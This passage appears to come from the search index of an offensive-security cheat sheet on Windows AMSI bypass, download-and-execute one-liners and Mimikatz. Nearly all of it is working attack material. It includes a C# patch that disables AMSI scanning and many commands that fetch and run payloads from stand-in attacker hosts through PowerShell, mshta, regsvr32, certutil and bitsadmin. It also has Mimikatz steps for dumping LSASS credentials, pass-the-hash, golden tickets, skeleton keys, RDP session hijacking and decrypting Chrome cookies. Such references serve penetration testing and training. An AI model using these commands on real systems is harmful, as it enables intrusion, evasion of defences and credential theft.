powershell.exe to the current working directory.\" Copy-Item -Path C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Destination $pwd Write-Verbose \"Starting powershell.exe from the current working directory.\" & \"$pwd\\powershell.exe\" } } \"psv2\" { Write-Verbose \"Using PowerShell version 2 which doesn't support AMSI.\" if ($ShowOnly -eq $True) { Write-Output \"If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process.\" } else { Write-Verbose \"Checking if .Net version 2.0.50727 is installed.\" $versions = Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\\p{L}'} | Select -ExpandProperty Version if($versions -match \"2.0.50727\") { Write-Verbose \".Net version 2.0.50727 found.\" Write-Output \"Executing the bypass.\" powershell.exe -version 2 } else { Write-Verbose \".Net version 2.0.50727 not found. Can't start PowerShell v2.\" } } } \"obfuscation\" { Write-Output \"AMSI and the AVs which support it can be bypassed using obfuscation techqniues.\" Write-Output \"ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) and Invoke-Obfuscation can be used (https://github.com/danielbohannon/Invoke-Obfuscation).\" } } }","title":"Nishang all in one"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#adam-chester-patch","text":"Bypass Update by Adam Chester https://twitter.com/ xpn /status/1170852932650262530 $Winpatch = @\" using System; using System.Runtime.InteropServices; public class patch { // https://twitter.com/_xpn_/status/1170852932650262530 static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }; public static void it() { if (is64Bit()) PatchAmsi(x64); else PatchAmsi(x86); } private static void PatchAmsi(byte[] patch) { try { var lib = Win32.LoadLibrary(\"a\" + \"ms\" + \"i.dll\"); var addr = Win32.GetProcAddress(lib, \"AmsiScanBuffer\"); uint oldProtect; Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect); Marshal.Copy(patch, 0, addr, patch.Length); Console.WriteLine(\"Patch Sucessfull\"); } catch (Exception e) { Console.WriteLine(\" [x] {0}\", e.Message); Console.WriteLine(\" [x] {0}\", e.InnerException); } } private static bool is64Bit() { bool is64Bit = true; if (IntPtr.Size == 4) is64Bit = false; return is64Bit; } } class Win32 { [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } \"@ Add-Type -TypeDefinition $Winpatch -Language CSharp [patch]::it()","title":"Adam Chester Patch"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#amsifail","text":"AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures. - https://amsi.fail/","title":"AMSI.fail"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#references","text":"S3cur3Th1sSh1t - Amsi-Bypass-Powershell","title":"References"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/","text":"Windows - Download and execute methods Downloaded files location C:\\Users\\ \\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\ C:\\Users\\ \\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\ C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp\\TfsStore\\Tfs_DAV Powershell From an HTTP server powershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex\" # Download only (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/PowerUp.ps1\", \"C:\\Windows\\Temp\\PowerUp.ps1\") Invoke-WebRequest \"http://10.10.10.10/binary.exe\" -OutFile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\binary.exe\" # Download and run Rubeus, with arguments $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/Rubeus.exe') $assem = [System.Reflection.Assembly]::Load($data) [Rubeus.Program]::Main(\"s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt\".Split()) # Execute a specific method from an assembly $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/lib.dll') $assem = [System.Reflection.Assembly]::Load($data) $class = $assem.GetType(\"ClassLibrary1.Class1\") $method = $class.GetMethod(\"runner\") $method.Invoke(0, $null) From a Webdav server powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1 Cmd cmd.exe /k < \\\\webdavserver\\folder\\batchfile.txt Cscript / Wscript cscript //E:jscript \\\\webdavserver\\folder\\payload.txt Mshta mshta vbscript:Close(Execute(\"GetObject(\"\"script:http://webserver/payload.sct\"\")\")) mshta http://webserver/payload.hta mshta \\\\webdavserver\\folder\\payload.hta Rundll32 rundll32 \\\\webdavserver\\folder\\payload.dll,entrypoint rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";o=GetObject(\"script:http://webserver/payload.sct\");window.close(); Regasm / Regsvc @subTee C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /u \\\\webdavserver\\folder\\payload.dll Regsvr32 @subTee regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll regsvr32 /u /n /s /i:\\\\webdavserver\\folder\\payload.sct scrobj.dll Odbcconf odbcconf /s /a {regsvr \\\\webdavserver\\folder\\payload_dll.txt} Msbuild cmd /V /c \"set MB=\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe\" & !MB! /noautoresponse /preprocess \\\\webdavserver\\folder\\payload.xml > payload.xml & !MB! payload.xml\" Certutil certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil /logfile= /LogToConsole=false /u payload.dll certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe Bitsadmin bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>/xyz.exe C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\local\\\\temp\\\\xyz.exe References arno0x0x - Windows oneliners to download remote payload and execute arbitrary code","title":"Windows - Download and execute methods"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#windows-download-and-execute-methods","text":"","title":"Windows - Download and execute methods"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#downloaded-files-location","text":"C:\\Users\\ \\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\ C:\\Users\\ \\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\ C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp\\TfsStore\\Tfs_DAV","title":"Downloaded files location"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#powershell","text":"From an HTTP server powershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex\" # Download only (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/PowerUp.ps1\", \"C:\\Windows\\Temp\\PowerUp.ps1\") Invoke-WebRequest \"http://10.10.10.10/binary.exe\" -OutFile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\binary.exe\" # Download and run Rubeus, with arguments $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/Rubeus.exe') $assem = [System.Reflection.Assembly]::Load($data) [Rubeus.Program]::Main(\"s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt\".Split()) # Execute a specific method from an assembly $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/lib.dll') $assem = [System.Reflection.Assembly]::Load($data) $class = $assem.GetType(\"ClassLibrary1.Class1\") $method = $class.GetMethod(\"runner\") $method.Invoke(0, $null) From a Webdav server powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1","title":"Powershell"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#cmd","text":"cmd.exe /k < \\\\webdavserver\\folder\\batchfile.txt","title":"Cmd"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#cscript-wscript","text":"cscript //E:jscript \\\\webdavserver\\folder\\payload.txt","title":"Cscript / Wscript"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#mshta","text":"mshta vbscript:Close(Execute(\"GetObject(\"\"script:http://webserver/payload.sct\"\")\")) mshta http://webserver/payload.hta mshta \\\\webdavserver\\folder\\payload.hta","title":"Mshta"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#rundll32","text":"rundll32 \\\\webdavserver\\folder\\payload.dll,entrypoint rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";o=GetObject(\"script:http://webserver/payload.sct\");window.close();","title":"Rundll32"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#regasm-regsvc-subtee","text":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /u \\\\webdavserver\\folder\\payload.dll","title":"Regasm / Regsvc @subTee"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#regsvr32-subtee","text":"regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll regsvr32 /u /n /s /i:\\\\webdavserver\\folder\\payload.sct scrobj.dll","title":"Regsvr32 @subTee"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#odbcconf","text":"odbcconf /s /a {regsvr \\\\webdavserver\\folder\\payload_dll.txt}","title":"Odbcconf"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#msbuild","text":"cmd /V /c \"set MB=\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe\" & !MB! /noautoresponse /preprocess \\\\webdavserver\\folder\\payload.xml > payload.xml & !MB! payload.xml\"","title":"Msbuild"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#certutil","text":"certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil /logfile= /LogToConsole=false /u payload.dll certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe","title":"Certutil"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#bitsadmin","text":"bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>/xyz.exe C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\local\\\\temp\\\\xyz.exe","title":"Bitsadmin"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#references","text":"arno0x0x - Windows oneliners to download remote payload and execute arbitrary code","title":"References"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/","text":"Windows - Mimikatz Summary Mimikatz - Execute commands Mimikatz - Extract passwords Mimikatz - LSA Protection Workaround Mimikatz - Mini Dump Mimikatz - Pass The Hash Mimikatz - Golden ticket Mimikatz - Skeleton key Mimikatz - RDP session takeover Mimikatz - Credential Manager & DPAPI Chrome Cookies & Credential Task Scheduled credentials Vault Mimikatz - Commands list Mimikatz - Powershell version References Mimikatz - Execute commands Only one command PS C:\\temp\\mimikatz> .\\mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit Mimikatz console (multiple commands) PS C:\\temp\\mimikatz> .\\mimikatz mimikatz # privilege::debug mimikatz # log mimikatz # sekurlsa::logonpasswords mimikatz # sekurlsa::wdigest Mimikatz - Extract passwords Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled. mimikatz_command -f sekurlsa::logonPasswords full mimikatz_command -f sekurlsa::wdigest # to re-enable wdigest in Windows Server 2012+ # in HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest # create a DWORD 'UseLogonCredential' with the value 1. reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1 :warning: To take effect, conditions are required : - Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2: * Adding requires lock * Removing requires signout - Win10: * Adding requires signout * Removing requires signout - Win2016: * Adding requires lock * Removing requires reboot Mimikatz - LSA Protection Workaround LSA as a Protected Process (RunAsPPL) ```powershell # Check if LSA runs as a protected process by looking if the variable \"RunAsPPL\" is set to 0x1 reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa # Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe # Now lets import the mimidriver.sys to the system mimikatz # !+ # Now lets remove the protection flags from lsass.exe process mimikatz # !processprotect /process:lsass.exe /remove # Finally run the logonpasswords function to dump lsass mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::logonpasswords # Now lets re-add the protection flags to the lsass.exe process mimikatz # !processprotect /process:lsass.exe # Unload the service created mimikatz # !- # https://github.com/itm4n/PPLdump PPLdump.exe [-v] [-d] [-f] PPLdump.exe lsass.exe lsass.dmp PPLdump.exe -v 720 out.dmp ``` LSA is running as virtualized process (LSAISO) by Credential Guard ```powershell # Check if a process called lsaiso.exe exists on the running processes tasklist |findstr lsaiso # Lets inject our own malicious Security Support Provider into memory # require mimilib.dll in the same folder mimikatz # misc::memssp # Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\\windows\\system32\\mimilsa.log ``` Mimikatz - Mini Dump Dump the lsass process with procdump Windows Defender is triggered when a memory dump of lsass is operated, quickly leading to the deletion of the dump. Using lsass's process identifier (pid) \"bypasses\" that. # HTTP method - using the default way certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\\Users\\Public\\procdump.exe C:\\Users\\Public\\procdump.exe -accepteula -ma lsass.exe lsass.dmp # SMB method - using the pid net use Z: https://live.sysinternals.com tasklist /fi \"imagename eq lsass.exe\" # Find lsass's pid Z:\\procdump.exe -accepteula -ma $lsass_pid lsass.dmp Dump the lsass process with rundll32 rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsass_pid C:\\temp\\lsass.dmp full Then load it inside Mimikatz. mimikatz # sekurlsa::minidump lsass.dmp Switch to minidump mimikatz # sekurlsa::logonPasswords Mimikatz - Pass The Hash mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell Mimikatz - Golden ticket .\\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt .\\mimikatz \"kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" exit Mimikatz - Skeleton key privilege::debug misc::skeleton # map the share net use p: \\\\WIN-PTELU2U07KG\\admin$ /user:john mimikatz # login as someone rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab Mimikatz - RDP session takeover Use ts::multirdp to patch the RDP service to allow more than two users. Run tscon.exe as the SYSTEM user, you can connect to any session without a password. privilege::debug token::elevate ts::remote /id:2 # get the Session ID you want to hijack query user create sesshijack binpath= \"cmd.exe /k tscon 1 /dest:rdp-tcp#55\" net start sesshijack Mimikatz - Credential Manager & DPAPI # check the folder to find credentials dir C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Credentials\\* # check the file with mimikatz $ mimikatz dpapi::cred /in:C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0 # find master key $ mimikatz !sekurlsa::dpapi # use master key $ mimikatz dpapi::cred /in:C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b Chrome Cookies & Credential # Saved Cookies dpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies\" /unprotect dpapi::chrome /in:\"C:\\Users\\kbell\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b # Saved Credential in Chrome dpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect Task Scheduled credentials mimikatz(commandline) # vault::cred /patch TargetName : Domain:batch=TaskScheduler:Task:{CF3ABC3E-4B17-ABCD-0003-A1BA192CDD0B} / <NULL> UserName : DOMAIN\\user Comment : <NULL> Type : 2 - domain_password Persist : 2 - local_machine Flags : 00004004 Credential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX Attributes : 0 Vault vault::cred /in:C:\\Users\\demo\\AppData\\Local\\Microsoft\\Vault\\\" Mimikatz - Commands list Command Definition CRYPTO::Certificates list/export certificates CRYPTO::Certificates list/export certificates KERBEROS::Golden create golden/silver/trust tickets KERBEROS::List list all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user\u2019s tickets.Similar to functionality of \u201cklist\u201d. KERBEROS::PTT pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust). LSADUMP::DCSync ask a DC to synchronize an object (get password data for account). No need to run code on DC. LSADUMP::LSA Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: \u201c/name:krbtgt\u201d LSADUMP::SAM get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer. LSADUMP::Trust Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest). MISC::AddSid Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016. MISC::MemSSP Inject a malicious Windows SSP to log locally authenticated credentials. MISC::Skeleton Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a \u201cmaster password\u201d (aka Skeleton Keys) as well as their usual password. PRIVILEGE::Debug get debug rights (this or Local System rights is required for many Mimikatz commands). SEKURLSA::Ekeys list Kerberos encryption keys SEKURLSA::Kerberos List Kerberos credentials for all authenticated users (including services and computer account) SEKURLSA::Krbtgt get Domain Kerberos service account (KRBTGT)password data SEKURLSA::LogonPasswords lists all available provider credentials. This usually shows recently logged on user and computer credentials. SEKURLSA::Pth Pass- theHash and Over-Pass-the-Hash SEKURLSA::Tickets Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer\u2019s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users). TOKEN::List list all tokens of the system TOKEN::Elevate impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box TOKEN::Elevate /domainadmin impersonate a token with Domain Admin credentials. Mimikatz - Powershell version Mimikatz in memory (no binary on disk) with : Invoke-Mimikatz from PowerShellEmpire Invoke-Mimikatz from PowerSploit More information can be grabbed from the Memory with : Invoke-Mimikittenz References Unofficial Guide to Mimikatz & Command Reference Skeleton Key Reversing Wdigest configuration in Windows Server 2012 R2 and Windows Server 2016 - 5TH DECEMBER 2017 - ACOUCH","title":"Windows - Mimikatz"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#windows-mimikatz","text":"","title":"Windows - Mimikatz"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#summary","text":"Mimikatz - Execute commands Mimikatz - Extract passwords Mimikatz - LSA Protection Workaround Mimikatz - Mini Dump Mimikatz - Pass The Hash Mimikatz - Golden ticket Mimikatz - Skeleton key Mimikatz - RDP session takeover Mimikatz - Credential Manager & DPAPI Chrome Cookies & Credential Task Scheduled credentials Vault Mimikatz - Commands list Mimikatz - Powershell version References","title":"Summary"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#mimikatz-execute-commands","text":"Only one command PS C:\\temp\\mimikatz> .\\mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit Mimikatz console (multiple commands) PS C:\\temp\\mimikatz> .\\mimikatz mimikatz # privilege::debug mimikatz # log mimikatz # sekurlsa::logonpasswords mimikatz # sekurlsa::wdigest","title":"Mimikatz - Execute commands"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#mimikatz-extract-passwords","text":"Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled. mimikatz_command -f sekurlsa::logonPasswords full mimikatz_command -f sekurlsa::wdigest # to re-enable wdigest in Windows Server 2012+ # in HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest # create a DWORD 'UseLogonCredential' with the value 1. reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1 :warning: To take effect, conditions are required : - Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2: * Adding requires lock * Removing requires signout - Win10: * Adding requires signout * Removing requires signout - Win2016: * Adding requires lock * Removing requires reboot","title":"Mimikatz - Extract passwords"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#mimikatz-lsa-protection-workaround","text":"LSA as a Protected Process (RunAsPPL) ```powershell # Check if LSA runs as a protected process by looking if the variable \"RunAsPPL\" is set to 0x1 reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa # Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe # Now lets import the mimidriver.sys to the system mimikatz # !+ # Now lets remove the protection flags from lsass.exe process mimikatz # !processprotect /process:lsass.exe /remove # Finally run the logonpasswords function to dump lsass mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::logonpasswords # Now lets re-add the protection flags to the lsass.exe process mimikatz # !processprotect /process:lsass.exe # Unload the service created mimikatz # !- # https://github.com/itm4n/PPLdump PPLdump.exe [-v] [-d] [-f] PPLdump.exe lsass.exe lsass.dmp PPLdump.exe -v 720 out.dmp ``` LSA is running as virtualized process (LSAISO) by Credential Guard ```powershell # Check if a process called lsaiso.exe exists on the running processes tasklist |findstr lsaiso # Lets inject our own malicious Security Support Provider into memory # require mimilib.dll in the same folder mimikatz # misc::memssp # Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\\windows\\system32\\mimilsa.log ```","title":"Mimikatz - LSA Protection Workaround"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#mimikatz-mini-dump","text":"Dump the lsass process with procdump Windows Defender is triggered when a memory dump of lsass is operated, quickly leading to the deletion of the dump. Using lsass's process identifier (pid) \"bypasses\" that. # HTTP method - using the default way certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\\Users\\Public\\procdump.exe C:\\Users\\Public\\procdump.exe -accepteula -ma lsass.exe lsass.dmp # SMB method - using the pid net use Z: https://live.sysinternals.com tasklist /fi \"imagename eq lsass.exe\" # Find lsass's pid Z:\\procdump.exe -accepteula -ma $lsass_pid lsass.dmp Dump the lsass process with rundll32 rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsass_pid C:\\temp\\lsass.dmp full Then load it inside Mimikatz. mimikatz # sekurlsa::minidump lsass.dmp Switch to minidump mimikatz # sekurlsa::logonPasswords","title":"Mimikatz - Mini Dump"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#mimikatz-pass-the-hash","text":"mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell","title":"Mimikatz - Pass The Hash"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#mimikatz-golden-ticket","text":".\\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt .\\mimikatz \"kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" exit","title":"Mimikatz - Golden ticket"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#mimikatz-skeleton-key","text":"privilege::debug misc::skeleton # map the share net use p: \\\\WIN-PTELU2U07KG\\admin$ /user:john mimikatz # login as someone rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab","title":"Mimikatz - Skeleton key"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#mimikatz-rdp-session-takeover","text":"Use ts::multirdp to patch the RDP service to allow more than two users. Run tscon.exe as the SYSTEM user, you can connect to any session without a password. privilege::debug token::elevate ts::remote /id:2 # get the Session ID you want to hijack query user create sesshijack binpath= \"cmd.exe /k tscon 1 /dest:rdp-tcp#55\" net start sesshijack","title":"Mimikatz - RDP session takeover"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#mimikatz-credential-manager-dpapi","text":"# check the folder to find credentials dir C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Credentials\\* # check the file with mimikatz $ mimikatz dpapi::cred /in:C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0 # find master key $ mimikatz !sekurlsa::dpapi # use master key $ mimikatz dpapi::cred /in:C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b","title":"Mimikatz - Credential Manager &amp; DPAPI"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#chrome-cookies-credential","text":"# Saved Cookies dpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies\" /unprotect dpapi::chrome /in:\"C:\\Users\\kbell\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b # Saved Credential in Chrome dpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect","title":"Chrome Cookies &amp; Credential"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#task-scheduled-credentials","text":"mimikatz(commandline) # vault::cred /patch TargetName : Domain:batch=TaskScheduler:Task:{CF3ABC3E-4B17-ABCD-0003-A1BA192CDD0B} / <NULL> UserName : DOMAIN\\user Comment : <NULL> Type : 2 - domain_password Persist : 2 - local_machine Flags : 00004004 Credential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX Attributes : 0","title":"Task Scheduled credentials"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#vault","text":"vault::cred /in:C:\\Users\\demo\\AppData\\Local\\Microsoft\\Vault\\\"","title":"Vault"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#mimikatz-commands-list","text":"Command Definition CRYPTO::Certificates list/export certificates CRYPTO::Certificates list/export certificates KERBEROS::Golden create golden/silver/trust tickets KERBEROS::List list all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user\u2019s tickets.Similar to functionality of \u201cklist\u201d. KERBEROS::PTT pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust). LSADUMP::DCSync ask a DC to synchronize an object (get password data for account). No need to run code on DC. LSADUMP::LSA Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: \u201c/name:krbtgt\u201d LSADUMP::SAM get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer. LSADUMP::Trust Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest). MISC::AddSid Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016. MISC::MemSSP Inject a malicious Windows SSP to log locally authenticated credentials. MISC::Skeleton Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a \u201cmaster password\u201d (aka Skeleton Keys) as well as their usual password. PRIVILEGE::Debug get 